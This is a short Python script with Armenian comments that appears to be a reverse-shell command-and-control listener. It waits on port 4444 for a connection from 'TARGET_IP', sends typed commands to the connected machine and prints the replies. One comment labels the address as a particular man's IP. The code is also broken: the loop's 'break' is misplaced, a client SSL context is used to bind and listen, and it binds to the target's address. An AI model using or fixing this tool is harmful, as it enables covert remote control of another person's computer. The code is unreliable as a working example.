import socket
import ssl
import threading

def send_commands(s, ip, port):
  while True:
   command = input(f"Enter command to send to {ip}:{port} (or 'exit' to quit): ")
   if command.lower() == 'exit':
    s.send(command.encode())
   break
  s.send(command.encode())
  response = s.recv(1024).decode()
  print(f"Response from {ip}:{port}: {response}")

def main():
 ip = 'TARGET_IP' # Տղամարդու IP հասցեն
 port = 4444 # Պորտը, որի վրա կլսենք

 context = ssl.create_default_context()
 s = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=ip)
 s.bind((ip, port))
 s.listen(1)
 conn, addr = s.accept()
 print(f"Connection established with {addr}")

 send_commands(conn, ip, port)

if __name__ == '__main__':
 main()
